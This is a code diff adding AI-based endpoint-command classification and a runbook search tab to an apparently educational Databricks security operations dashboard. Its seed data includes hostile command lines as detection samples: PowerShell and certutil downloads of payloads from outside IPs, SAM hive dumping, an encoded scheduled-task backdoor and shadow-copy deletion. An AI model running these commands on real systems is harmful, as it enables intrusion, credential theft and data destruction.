@@ -138,11 +138,13 @@ st.set_page_config(
 st.title("SecOps Operator View")
 st.caption("Databricks Security Data Lakehouse — Single Source of Truth | Smart Forwarding | AI Triage")
 
-tab_about, tab_metrics, tab_hunt, tab_triage, tab_posture = st.tabs([
+tab_about, tab_metrics, tab_hunt, tab_triage, tab_ai_sql, tab_runbook, tab_posture = st.tabs([
     "About",
     "Metrics Dashboard",
     "Threat Hunt Search",
     "AI Triage Agent",
+    "AI SQL Classification",
+    "SOC Runbook (RAG)",
     "System Posture",
 ])
 
@@ -172,17 +174,15 @@ and learning purposes — not for production use.
     col1, col2 = st.columns(2)
     with col1:
         st.markdown("""
-- **Metrics Dashboard** — All 35TB of logs live in Databricks as the single
-  source of truth. Only the 5% that needs active SOAR gets forwarded to Google SecOps.
-- **Threat Hunt Search** — Instant, serverless search across 100% of your data —
-  including the 95% you'd never put in Chronicle.
+- **Metrics Dashboard** — All 35TB lives in Databricks. Only 5% forwarded to Google SecOps.
+- **Threat Hunt Search** — Instant search across 100% of your data, including the 95% you'd never put in Chronicle.
+- **AI Triage Agent** — Foundation Model API + RAG runbook analysis + remediation payloads.
 """)
     with col2:
         st.markdown("""
-- **AI Triage Agent** — Foundation Model API + RAG-grounded runbook analysis
-  with copy-paste remediation payloads for Palo Alto, SOAR, and CrowdStrike.
-- **System Posture** — Out-of-the-box workspace audit dashboards
-  from Databricks system tables — no agents to install.
+- **AI SQL Classification** — `ai_query()` classifies endpoint commands as MALICIOUS/BENIGN directly inside SQL. No Python needed.
+- **SOC Runbook (RAG)** — Search your incident response procedures using natural language via Vector Search.
+- **System Posture** — Workspace audit dashboards from Databricks system tables.
 """)
 
     st.divider()
@@ -493,7 +493,160 @@ Provide:
 
 
 # ===========================================================================
-# TAB 4: System Posture
+# TAB 4: AI SQL Classification (ai_query)
+# ===========================================================================
+with tab_ai_sql:
+    st.header("AI SQL Classification — `ai_query()`")
+    st.markdown(
+        "An analyst who knows SQL can classify endpoint commands as **MALICIOUS** or **BENIGN** "
+        "at scale — no Python, no API keys, no external services. The Foundation Model runs "
+        "inside a standard `SELECT` statement using Databricks `ai_query()`."
+    )
+    with st.expander("Behind the scenes"):
+        st.markdown(
+            "The `ai_query()` function is a built-in SQL function that calls a **Foundation Model API** "
+            "endpoint directly from a SQL query. The model runs inside the Databricks environment. "
+            "Each row is sent to the model, classified, and the result is returned as a column — "
+            "just like any other SQL function. This works on any **Serverless SQL Warehouse**."
+        )
+
+    # Check if endpoint_logs table exists
+    df_check = run_sql(f"""
+        SELECT COUNT(*) as cnt
+        FROM {CATALOG}.{SCHEMA}.endpoint_logs
+    """)
+
+    if df_check.empty or int(df_check["cnt"].iloc[0]) == 0:
+        st.warning("The `endpoint_logs` table hasn't been created yet. "
+                   "Run the `03_ai_query_sql` notebook first to create it, "
+                   "or click below to create it now.")
+        if st.button("Create Endpoint Logs Table", type="primary"):
+            with st.spinner("Creating endpoint_logs table..."):
+                run_sql(f"""
+                    CREATE OR REPLACE TABLE {CATALOG}.{SCHEMA}.endpoint_logs AS
+                    SELECT * FROM VALUES
+                      ('EP-1001', 'workstation-042', 'jsmith', 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1MC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=', '2024-03-15T09:23:41Z', 'CRITICAL'),
+                      ('EP-1002', 'dc-primary', 'admin', 'cmd.exe /c whoami /all && net group "Domain Admins" /domain && nltest /dclist:', '2024-03-15T09:24:02Z', 'HIGH'),
+                      ('EP-1003', 'workstation-107', 'mjones', 'outlook.exe', '2024-03-15T09:24:15Z', 'INFO'),
+                      ('EP-1004', 'server-web-03', 'svc_iis', 'certutil.exe -urlcache -split -f http://45.155.205.233/beacon.exe C:\\Windows\\Temp\\svchost.exe && C:\\Windows\\Temp\\svchost.exe', '2024-03-15T09:25:33Z', 'CRITICAL'),
+                      ('EP-1005', 'workstation-042', 'jsmith', 'chrome.exe --new-tab https://mail.google.com', '2024-03-15T09:26:01Z', 'INFO'),
+                      ('EP-1006', 'server-db-01', 'svc_sql', 'reg.exe save HKLM\\SAM C:\\temp\\sam.save && reg.exe save HKLM\\SYSTEM C:\\temp\\sys.save', '2024-03-15T09:27:44Z', 'CRITICAL'),
+                      ('EP-1007', 'workstation-089', 'analyst2', 'python3 /opt/tools/scan_report.py --output pdf', '2024-03-15T09:28:00Z', 'INFO'),
+                      ('EP-1008', 'server-web-03', 'svc_iis', 'powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://89.248.167.131:8080/shell.ps1'')"', '2024-03-15T09:29:12Z', 'CRITICAL'),
+                      ('EP-1009', 'workstation-023', 'tchen', 'notepad.exe C:\\Users\\tchen\\Documents\\meeting_notes.txt', '2024-03-15T09:30:00Z', 'INFO'),
+                      ('EP-1010', 'dc-primary', 'admin', 'schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "powershell -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgTgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADAALgA1AC4AMgAyACcALAA0ADQANAA0ACkA"', '2024-03-15T09:31:55Z', 'CRITICAL'),
+                      ('EP-1011', 'workstation-107', 'mjones', 'teams.exe', '2024-03-15T09:32:10Z', 'INFO'),
+                      ('EP-1012', 'server-file-01', 'svc_backup', 'vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete', '2024-03-15T09:33:28Z', 'CRITICAL')
+                    AS t(endpoint_id, hostname, username, raw_command, event_time, alert_level)
+                """)
+                st.rerun()
+    else:
+        st.subheader("Endpoint Logs")
+        df_logs = run_sql(f"""
+            SELECT endpoint_id, hostname, username, alert_level,
+                   LEFT(raw_command, 80) as command_preview
+            FROM {CATALOG}.{SCHEMA}.endpoint_logs
+            ORDER BY event_time
+        """)
+        if not df_logs.empty:
+            st.dataframe(df_logs, use_container_width=True)
+
+        st.divider()
+        st.subheader("AI Verdict — One-Word Classification")
+        st.markdown("Each command is sent to the Foundation Model inside a SQL `SELECT`. "
+                    "The model returns **MALICIOUS** or **BENIGN** as a column value.")
+        if st.button("Run ai_query() Classification", type="primary"):
+            with st.spinner("Running Foundation Model on each row via ai_query()..."):
+                df_verdict = run_sql(f"""
+                    SELECT
+                      endpoint_id, hostname, username,
+                      LEFT(raw_command, 60) as command_preview,
+                      ai_query(
+                        '{LLM_ENDPOINT}',
+                        'You are a malware analyst. Analyze this command line from an endpoint log. '
+                        || 'Return ONLY one word: MALICIOUS or BENIGN. '
+                        || 'Command: ' || raw_command
+                      ) as ai_verdict
+                    FROM {CATALOG}.{SCHEMA}.endpoint_logs
+                    ORDER BY event_time
+                """)
+                if not df_verdict.empty:
+                    st.dataframe(df_verdict, use_container_width=True)
+
+        st.divider()
+        st.subheader("Deep Analysis — MITRE ATT&CK Classification")
+        st.markdown("Same SQL pattern, but now the model explains *what* the attack is doing.")
+        if st.button("Run MITRE ATT&CK Analysis", type="secondary"):
+            with st.spinner("Running deep analysis on CRITICAL/HIGH alerts..."):
+                df_mitre = run_sql(f"""
+                    SELECT
+                      endpoint_id, hostname, raw_command,
+                      ai_query(
+                        '{LLM_ENDPOINT}',
+                        'You are a senior threat analyst. Analyze this command from an endpoint log. '
+                        || 'In exactly 2 sentences: (1) classify as MALICIOUS or BENIGN, '
+                        || '(2) if malicious, name the MITRE ATT&CK technique. '
+                        || 'Command: ' || raw_command
+                      ) as ai_analysis
+                    FROM {CATALOG}.{SCHEMA}.endpoint_logs
+                    WHERE alert_level IN ('CRITICAL', 'HIGH')
+                    ORDER BY event_time
+                """)
+                if not df_mitre.empty:
+                    for _, row in df_mitre.iterrows():
+                        with st.container():
+                            st.markdown(f"**{row['endpoint_id']}** — `{row['hostname']}`")
+                            st.code(row["raw_command"], language="shell")
+                            st.markdown(row["ai_analysis"])
+                            st.divider()
+
+
+# ===========================================================================
+# TAB 5: SOC Runbook (RAG)
+# ===========================================================================
+with tab_runbook:
+    st.header("SOC Runbook — Natural Language Search")
+    st.markdown(
+        "Your incident response procedures live in a **Vector Search index** with managed embeddings. "
+        "Ask a question in plain English and the system retrieves the most relevant runbook sections — "
+        "the same retrieval that powers the AI Triage Agent's grounded recommendations."
+    )
+    with st.expander("Behind the scenes"):
+        st.markdown(
+            "The SOC Runbook (10 sections covering brute force, C2, exfiltration, lateral movement, etc.) "
+            "is stored in a **Delta table**. A **Vector Search** index with **managed embeddings** (GTE-Large) "
+            "automatically vectorizes each section. When you search, your query is embedded by the same model "
+            "and matched against the runbook via cosine similarity. No manual embedding code needed."
+        )
+
+    runbook_query = st.text_input(
+        "Ask a question about incident response:",
+        placeholder="e.g., What do I do if I detect SSH brute force?",
+        help="Try: 'lateral movement response', 'data exfiltration GDPR', 'how to block an IP on Palo Alto', 'evidence preservation'"
+    )
+
+    if runbook_query:
+        with st.spinner("Searching runbook via Vector Search..."):
+            results = search_runbook(runbook_query, num_results=3)
+            if results and "unavailable" not in results.lower():
+                st.markdown(results)
+            else:
+                st.warning("No results found. Try a different query.")
+
+    st.divider()
+    st.subheader("Full Runbook Index")
+    st.markdown("All sections stored in the Vector Search index:")
+    df_runbook = run_sql(f"""
+        SELECT section_id, title
+        FROM {CATALOG}.{SCHEMA}.soc_runbook_chunks
+        ORDER BY section_id
+    """)
+    if not df_runbook.empty:
+        st.dataframe(df_runbook, use_container_width=True, hide_index=True)
+
+
+# ===========================================================================
+# TAB 6: System Posture
 # ===========================================================================
 with tab_posture:
     st.header("Workspace Security Posture")
